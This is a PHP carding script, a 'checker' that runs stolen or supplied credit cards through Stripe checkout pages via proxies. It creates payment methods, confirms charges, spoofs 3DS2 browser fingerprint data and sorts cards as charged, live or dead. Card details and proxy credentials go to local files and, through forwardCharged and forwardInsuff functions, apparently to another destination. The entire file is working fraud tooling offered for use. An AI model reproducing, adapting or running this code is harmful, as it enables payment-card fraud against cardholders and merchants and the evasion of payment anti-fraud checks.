<?php
include "functions.php";
$count = 0;
retry:
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_pages/'.$cslive.'/init');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'key='.$pklive.'&eid=NA&browser_locale=en-US&redirect_type=url');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'accept: application/json',
    'content-type: application/x-www-form-urlencoded',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36'
]);
$response = curl_exec($ch);
curl_close($ch);
$json = json_decode($response, true);
if ($json === null) {
    echo "<font color=red><b>INIT RESPONSE: $response<br>";
} else {
    if (isset($json['error'])) {
        $errorCode = $json['error']['code'];
        $errorMessage = $json['error']['message'];
        echo "<font color=yellow><b>DEAD<br> $card<br> [ Payment Failed ] » [$errorCode » $errorMessage] » [$ips] » [Retries: $count]<br>";
        return;
    } else {
        $initChecksum = $json['init_checksum'];
        $coname = $json['account_settings']['display_name'];
        $currency = $json['currency'];
        $items = $json['line_item_group']['line_items'][0]['name'];
    }
}
if (isset($json['line_item_group']['line_items'][0]['total'])) {
    $amount = $json['line_item_group']['line_items'][0]['total'];
} elseif (isset($json['invoice']['total'])) {
    $amount = $json['invoice']['total'];
} elseif (isset($json['line_item_group']['total'])) {
    $amount = $json['line_item_group']['total'];
} 
###########

$amttt = intval($amount)/100;

####################
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
$headers = array(
    'accept: application/json',
    'content-type: application/x-www-form-urlencoded'
);
$data = array(
    'type' => 'card',
    'card[number]' => $cc,
    'card[exp_month]' => $mm,
    'card[exp_year]' => $yy,
    'billing_details[name]' => $fname . ' ' . $lname,
    'billing_details[email]' => $email,
    'billing_details[address][country]' => 'PH',
    'key' => $pklive,
    'payment_user_agent' => 'stripe.js/c5d6d3bd0a;+stripe-js-v3/c5d6d3bd0a;+checkout'
);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$response = curl_exec($ch);
if ($response === false) {
    echo 'cURL error: ' . curl_error($ch);
}
curl_close($ch);
$json = json_decode($response, true);
if ($json !== null && isset($json['id'])) {
    $newpm = $json['id'];
    $pm = '{"id":"' . $newpm . 'NK5y"';
    $newpm_enc = get_js_encoded_string($pm);
} else {
    $message = isset($json['error']['message']) ? $json['error']['message'] : '';
    if ($message) {
        echo "<font color=yellow><b>DEAD<br> $card<br> [ Payment Failed ] » [$message] » [$ips] » [Retries: $count]<br>";
        return;
    } elseif (strpos($result, 'You passed')) {
        $count++;
        goto retry;
    }
}

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
$data = array(
    'eid' => 'NA',
    'payment_method' => $newpm,
    'expected_amount' => $amount,
    'expected_payment_method_type' => 'card',
    'key' => $pklive,
    'version' => 'c5d6d3bd0a',
    'init_checksum' => $initChecksum,
    'js_checksum' => $newpm_enc
);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_pages/'.$cslive.'/confirm');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$response = curl_exec($ch);
curl_close($ch);
$json = json_decode($response, true);
$payatt = $json['payment_intent']['next_action']['use_stripe_sdk']['three_d_secure_2_source'];
$servertrans = $json['payment_intent']['next_action']['use_stripe_sdk']['server_transaction_id'];
$result = '{"threeDSServerTransID":"'.$servertrans.'"}';
$enc_server = base64_encode($result);
$secret = $json['payment_intent']['client_secret'] ?? null;
$pi = $json['payment_intent']['id'] ?? null;
$message = $json['error']['message'] ?? null;
$dcode = $json['error']['decline_code'] ?? null;
$code = $json['error']['code'] ?? null;
$status = $json['status'] ?? null;
$surl = $json['success_url'] ?? null;
if ($status == 'succeeded') {
    $cardInfo = "Checkout INFO : $coname \nCard: $card \nSURL: $surl \nProxy IP: $proxy \nProxy Pass: $proxyauth";
    fwrite(fopen("peru--------CRGD.txt", "a"), $cardInfo . " \r\n\n");
    echo '<font color=green><b>#CHARGED CC: '.$card.'<br> ➤ The payment has been successfully processed ✅<br> ➤ Marchant: '.$coname.'<br> ➤ Item: '.$items.'<br>➤ Price: '.strtoupper($currency).' '.$amttt.'<br>➤ Receipt: [ <a href="'.$surl.'"  target="_blank"><b>'.$surl.'</b></a> ]<br> ➤ Checked from » <a href="https://jetixchecker.com/">𝙅𝙚𝙩𝙞𝙭</a> » ['.$ips.']<br>';
    forwardCharged($cardInfo);
    return;
}
// elseif (strpos($response, 'You passed')) {
//     $count++; goto retry;
// }
elseif (strpos($response, 'insufficient_funds')) {
    echo '<font color=green><b>#LIVE CC: '.$card.'<br> ➤ Insufficient Funds ⚠️<br> ➤ Message: '.$message.'<br> ➤ Marchant: '.$coname.'<br> ➤ Item: '.$items.'<br>➤ Price: '.strtoupper($currency).' '.$amttt.'<br>➤ Checked from » <a href="https://jetixchecker.com/">𝙅𝙚𝙩𝙞𝙭</a> » ['.$ips.']<br>';
    $cardInfo = "Checkout INFO : $coname \nCard: $card \STATUS: $message \nProxy IP: $proxy \nProxy Pass: $proxyauth";
    fwrite(fopen("peru--------INSF.txt", "a"), $cardInfo . " \r\n\n");
    forwardInsuff($cardInfo);
    return;
}
elseif (strpos($response, '"verification_url": "')) {
  echo "<font color=red><b>DEAD<br> $card<br> [ HCAPTCHA Bypassed ] » [$ips] » [Retries: $count]<br>";
  return;
}
// elseif (empty($response)) {
//     $count++; goto retry;
// }
elseif ($message == true) {
    echo "<font color=red><b>DEAD<br> $card<br> [ Payment Failed ] » [$dcode : $code » $message] » [$ips] » [Retries: $count]<br>";
    exit();
}
// elseif (strpos($response, 'You passed')) {
//     $count++; goto retry;
// }
elseif (strpos($response, '"verification_url": "')) {
  echo "<font color=red><b>DEAD<br> $card<br> [ HCAPTCHA Bypassed ] » [$ips] » [Retries: $count]<br>";
  return;
}
// elseif (empty($response)) {
//     $count++; goto retry;
// }
#
$headers = array(
    'accept: application/json',
    'content-type: application/x-www-form-urlencoded',
    'referer: https://js.stripe.com/',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36'
);

$data = array(
    'source' => $payatt,
    'browser' => '{"fingerprintAttempted":true,"fingerprintData":"' . $enc_server . '","challengeWindowSize":null,"threeDSCompInd":"Y","browserJavaEnabled":false,"browserJavascriptEnabled":true,"browserLanguage":"en-US","browserColorDepth":"24","browserScreenHeight":"864","browserScreenWidth":"1536","browserTZ":"-480","browserUserAgent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"}',
    'one_click_authn_device_support[hosted]' => 'false',
    'one_click_authn_device_support[same_origin_frame]' => 'false',
    'one_click_authn_device_support[spc_eligible]' => 'true',
    'one_click_authn_device_support[webauthn_eligible]' => 'true',
    'one_click_authn_device_support[publickey_credentials_get_allowed]' => 'true',
    'key' => $pklive
);

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/3ds2/authenticate');
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$response = curl_exec($ch);
curl_close($ch);
$json = json_decode($response, true);
if ($json && isset($json['state'])) {
    $state = $json['state'];
    if ($state === 'challenge_required') {
        echo "<font color=red><b>DEAD<br> $card<br> [ 3DS BIN ] » [$state] » [$ips] » [Retries: $count]<br>";
        return;
    }
}
###############33
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
curl_setopt($ch, CURLOPT_URL, "https://api.stripe.com/v1/payment_intents/$pi?key=$pklive&is_stripe_sdk=false&client_secret=$secret");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'authority: api.stripe.com',
    'accept: application/json',
    'accept-language: en-US,en;q=0.9',
    'content-type: application/x-www-form-urlencoded',
    'origin: https://js.stripe.com',
    'referer: https://js.stripe.com/',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-site',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
]);
$extract = json_decode($result = curl_exec($ch), true);
curl_close($ch);
$status = $extract['status'];
$errormes = $extract['error']['message'];
$message = $extract['last_payment_error']['message'];
$dcode = $extract['last_payment_error']['decline_code'];
$code = $extract['last_payment_error']['code'];
if ($status == 'succeeded') {
    $cardInfo = "Checkout INFO : $coname \nCard: $card \nSURL: $surl \nProxy IP: $proxy \nProxy Pass: $proxyauth";
    fwrite(fopen("loly--------CRGD.txt", "a"), $cardInfo . " \r\n\n");
    echo '<font color=green><b>#CHARGED CC: '.$card.'<br> ➤ The payment has been successfully processed ✅<br> ➤ Marchant: '.$coname.'<br> ➤ Item: '.$items.'<br>➤ Price: '.strtoupper($currency).' '.$amttt.'<br>➤ Receipt: [ <a href="'.$surl.'"  target="_blank"><b>'.$surl.'</b></a> ]<br> ➤ Checked from » <a href="https://jetixchecker.com/">𝙅𝙚𝙩𝙞𝙭</a> » ['.$ips.']<br>';
    forwardCharged($cardInfo);
    return;
}
elseif (strpos($response, 'insufficient_funds')) {
    echo '<font color=green><b>#LIVE CC: '.$card.'<br> ➤ Insufficient Funds ⚠️<br> ➤ Message: '.$message.'<br> ➤ Marchant: '.$coname.'<br> ➤ Item: '.$items.'<br>➤ Price: '.strtoupper($currency).' '.$amttt.'<br>➤ Checked from » <a href="https://jetixchecker.com/">𝙅𝙚𝙩𝙞𝙭</a> » ['.$ips.']<br>';
    $cardInfo = "Checkout INFO : $coname \nCard: $card \STATUS: $message \nProxy IP: $proxy \nProxy Pass: $proxyauth";
    fwrite(fopen("loly--------INSF.txt", "a"), $cardInfo . " \r\n\n");
    forwardInsuff($cardInfo);
    return;
}
elseif (strpos($result, 'verify_challenge')) {
    echo "<font color=red><b>DEAD<br> $card<br> [ HCAPTCHA Bypassed] » [$ips] » [Retries: $count]<br>";
}
elseif (strpos($result, 'authentication_challenge')) {
    echo "<font color=red><b>DEAD<br> $card<br> [ OTP CC ] » [$ips] » [Retries: $count]<br>";

}
// elseif (strpos($result, 'Unrecognized')) {
//     $count++; goto retry;
// }
else {
    echo "<font color=red><b>DEAD<br> $card<br> [ Payment Failed ] » [$dcode : $code » $message] » [$ips] » [Retries: $count]<br>";
}
unset($ch);
?>
